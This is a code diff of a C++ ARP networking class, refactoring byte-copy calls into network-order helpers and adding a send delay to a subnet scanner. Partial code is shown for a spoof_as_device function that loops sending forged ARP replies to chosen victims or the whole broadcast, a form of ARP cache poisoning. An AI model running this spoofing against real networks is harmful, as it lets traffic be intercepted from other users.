@@ -20,14 +20,12 @@ mac_addr net_arp::search_for_mac_addr(ip4_addr searched_ip, mac_addr src_mac, ip
     arp_header->arp_pln = 4; // len of ip octets
     arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)
 
-    memcpy(arp_header->arp_sha, &src_mac, sizeof(arp_header->arp_sha));
+    write_in_network_order(arp_header->arp_sha, &src_mac);
     write_in_network_order(arp_header->arp_spa, &src_ip);
-//    memcpy(arp_header->arp_spa, &src_ip, sizeof(arp_header->arp_spa));
 //    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));
 
     memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
-    write_in_network_order((uint8_t *) &arp_header->arp_tpa, &searched_ip);
-//    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));
+    write_in_network_order(arp_header->arp_tpa, &searched_ip);
 
 
     ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
@@ -56,7 +54,7 @@ mac_addr net_arp::search_for_mac_addr(ip4_addr searched_ip, mac_addr src_mac, ip
         }
 
         mac_addr res{};
-        memcpy(res.octets, arp_reply->arp_sha, sizeof(res.octets));
+        extract_from_network_order(&res, arp_reply->arp_sha);
         return res;
     }
 }
@@ -80,14 +78,12 @@ vector<pair<ip4_addr, mac_addr>> net_arp::scan_entire_subnet(ip4_subnet_mask mas
         arp_header->arp_pln = 4; // len of ip octets
         arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)
 
-        memcpy(arp_header->arp_sha, &src_mac, sizeof(arp_header->arp_sha));
+        write_in_network_order(arp_header->arp_sha, &src_mac);
         write_in_network_order(arp_header->arp_spa, &src_ip);
-//        memcpy(arp_header->arp_spa, &my_ip, sizeof(arp_header->arp_spa));
-//    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));
+//        memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));
 
         memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
-        write_in_network_order((uint8_t *) &arp_header->arp_tpa, &curr_ip);
-//    memcpy(arp_header->arp_tpa, &target_ip, sizeof(arp_header->arp_tpa));
+        write_in_network_order(arp_header->arp_tpa, &curr_ip);
 
 
         // req
@@ -102,12 +98,13 @@ vector<pair<ip4_addr, mac_addr>> net_arp::scan_entire_subnet(ip4_subnet_mask mas
         ether_client.send_data(std::move(request));
 
         curr_ip = generate_next_ip(curr_ip);
+
+        std::this_thread::sleep_for(5ms);
     }
 
     std::cout << "search sends completed, waiting for replies" << endl;
 
     // wait some reasonable time for all the replies
-    using namespace std::chrono_literals;
     std::this_thread::sleep_for(3000ms);
 
     vector<pair<ip4_addr, mac_addr>> res;
@@ -121,10 +118,10 @@ vector<pair<ip4_addr, mac_addr>> net_arp::scan_entire_subnet(ip4_subnet_mask mas
             continue;
 
         mac_addr res_mac{};
-        memcpy(res_mac.octets, arp_reply->arp_sha, sizeof(res_mac.octets));
+        extract_from_network_order(&res_mac, arp_reply->arp_sha);
 
         ip4_addr res_ip;
-        extract_from_network_order(&res_ip, (uint8_t *) &arp_reply->arp_spa);
+        extract_from_network_order(&res_ip, arp_reply->arp_spa);
 
         res.emplace_back(res_ip, res_mac);
     }
@@ -154,13 +151,11 @@ void net_arp::spoof_as_device(const std::vector<ip4_addr> &victims_ip, ip4_addr 
     arp_header->arp_pln = 4; // len of ip octets
     arp_header->arp_op = htons(ARPOP_REPLY); // type of net_arp (forged reply)
 
-    memcpy(arp_header->arp_sha, &src_mac, sizeof(arp_header->arp_sha)); // my spoofed mac octets
-    write_in_network_order((uint8_t *) &arp_header->arp_spa, &target_ip);
-//    memcpy(arp_header->arp_spa, &device_ip, sizeof(arp_header->arp_spa)); // target_ip ip
+    write_in_network_order(arp_header->arp_sha, &src_mac); // my spoofed mac octets
+    write_in_network_order(arp_header->arp_spa, &target_ip);
 
 
     while (true) {
-        using namespace std::chrono_literals;
         std::this_thread::sleep_for(300ms);
 
         if (victims_ip.empty()) { // spoof whole broadcast
@@ -182,9 +177,8 @@ void net_arp::spoof_as_device(const std::vector<ip4_addr> &victims_ip, ip4_addr 
                 mac_addr victim_mac = victim_macs[i];
 
                 // send to specific target_ip
-                memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
-                write_in_network_order((uint8_t *) &arp_header->arp_tpa, &victim_ip);
-//                memcpy(arp_header->arp_tpa, &victims_ip, sizeof(arp_header->arp_tpa));
+                write_in_network_order(arp_header->arp_tha, &victim_mac);
+                write_in_network_order(arp_header->arp_tpa, &victim_ip);
 
                 ether_client.next_dest_addr.set_next_choice(victim_mac);
                 ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
@@ -228,11 +222,11 @@ void net_arp::announce_new_mac(ip4_addr src_ip, mac_addr new_mac) {
     arp_header->arp_pln = 4; // len of ip octets
     arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)
 
-    memcpy(arp_header->arp_sha, &new_mac, sizeof(arp_header->arp_sha));
+    write_in_network_order(arp_header->arp_sha, &new_mac);
     write_in_network_order(arp_header->arp_spa, &src_ip);
 
     memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
-    write_in_network_order((uint8_t *) &arp_header->arp_tpa, &src_ip);
+    write_in_network_order(arp_header->arp_tpa, &src_ip);
 
 
     ether_client.next_protocol.set_next_choice(htons(ETH_P_ARP));
